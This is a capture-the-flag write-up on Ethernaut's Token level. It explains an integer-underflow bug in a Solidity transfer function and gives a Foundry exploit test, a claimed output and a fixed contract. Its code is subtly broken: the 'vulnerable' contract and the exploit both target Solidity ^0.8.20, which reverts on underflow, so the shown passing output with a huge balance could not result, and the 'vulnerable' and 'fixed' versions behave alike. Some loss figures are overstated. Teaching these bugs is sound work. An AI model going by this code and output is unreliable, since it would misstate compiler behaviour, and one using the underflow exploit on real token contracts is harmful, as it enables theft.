# Ethernaut Level 5: Token

## Challenge Description
This is a simple token contract with a basic transfer function. You start with 20 tokens and need to get more tokens than you currently have.

**Difficulty:** ⭐⭐ (Beginner-Intermediate)

**Goal:** Get more than 20 tokens (your initial balance).

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

## Vulnerability Analysis

```text
THE BUG: Integer underflow in the transfer function!

Look at this line:
    require(balances[msg.sender] - _value >= 0);

In Solidity < 0.8.0, uint256 can underflow!

Example:
- Your balance: 20 tokens
- You try to transfer: 21 tokens
- Calculation: 20 - 21 = -1

But wait! uint256 CANNOT be negative!
In older Solidity, this would underflow to:
    2^256 - 1 = 115792089237316195423570985008687907853269984665640564039457584007913129639935

The require check:
    require(115792089237316195423570985008687907853269984665640564039457584007913129639935 >= 0)
    This PASSES! (because uint256 is always >= 0)

Result: You can transfer more tokens than you have!
```

## Exploit Strategy

```text
Step 1: Call transfer() with more tokens than you have
   - Your balance: 20 tokens
   - Transfer amount: 21 tokens (or any amount > 20)

Step 2: The underflow occurs
   - balances[msg.sender] = 20 - 21 = 2^256 - 1 (huge number!)
   - balances[_to] += 21

Step 3: Check your balance
   - You now have 2^256 - 1 tokens (practically infinite!)
   - You've completed the challenge
```

## Exploit Contract (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Ethernaut/Token.sol";

contract TokenExploitTest is Test {
    Token public target;
    address public attacker = address(0xBEEF);

    function setUp() public {
        // Deploy token with 20 initial supply to attacker
        vm.startPrank(attacker);
        target = new Token(20);
        vm.stopPrank();

        vm.deal(attacker, 1 ether);
    }

    function test_ExploitToken() public {
        console.log("Initial balance:", target.balanceOf(attacker));

        vm.startPrank(attacker);

        // Try to transfer 21 tokens (more than we have)
        // This will cause an underflow in Solidity < 0.8.0
        target.transfer(address(0x1234), 21);

        vm.stopPrank();

        uint256 newBalance = target.balanceOf(attacker);
        console.log("New balance:", newBalance);
        console.log("Is greater than 20?", newBalance > 20);

        assertGt(newBalance, 20, "Failed to get more tokens");
        console.log("\n✅ EXPLOIT SUCCESSFUL! Balance overflowed!");
    }
}
```

## Running the Exploit

```bash
# Note: This exploit works on Solidity < 0.8.0
# For Solidity 0.8.0+, the compiler automatically reverts on underflow
# So we need to compile with an older version or use unchecked blocks

forge test --match-test test_ExploitToken -vvv

# Expected output (with Solidity < 0.8.0):
# [PASS] test_ExploitToken() (gas: 67890)
# Logs:
#   Initial balance: 20
#   New balance: 115792089237316195423570985008687907853269984665640564039457584007913129639935
#   Is greater than 20? true
#
#   ✅ EXPLOIT SUCCESSFUL! Balance overflowed!
```

## Real-World Impact

```text
Integer overflow/underflow bugs caused BILLIONS in losses!

Famous Examples:
1. BeautyChain (2018): $800 billion tokens minted due to overflow
2. PoWHC (2018): $800K stolen due to integer overflow
3. Multiple DeFi protocols lost millions due to math errors

The Solution:
- Solidity 0.8.0+ has built-in overflow/underflow protection
- For older versions, use OpenZeppelin's SafeMath library
- Always use checked arithmetic or explicit overflow checks
```

## How to Fix This Vulnerability

```solidity
// FIXED VERSION - Solidity 0.8.0+ (automatic protection)
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract TokenFixed {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        // Solidity 0.8.0+ automatically reverts on underflow!
        // No need for manual checks
        balances[msg.sender] -= _value; // Reverts if _value > balance
        balances[_to] += _value;
        return true;
    }
}

// For Solidity < 0.8.0, use SafeMath:
// import "@openzeppelin/contracts/utils/math/SafeMath.sol";
// using SafeMath for uint256;
// balances[msg.sender] = balances[msg.sender].sub(_value); // Reverts on underflow
```

## Key Takeaways
- **Integer Overflow/Underflow:** One of the most common and dangerous smart contract bugs.
- **Solidity 0.8.0+ Protection:** Modern Solidity automatically reverts on overflow/underflow.
- **SafeMath Library:** For older contracts, always use OpenZeppelin's SafeMath.
- **Check Your Compiler Version:** Always know which Solidity version you're using and its safety features.
- **Lesson Learned:** Never assume arithmetic operations are safe. Always verify overflow protection.
- **Historical Context:** This bug type has caused more financial losses than any other vulnerability.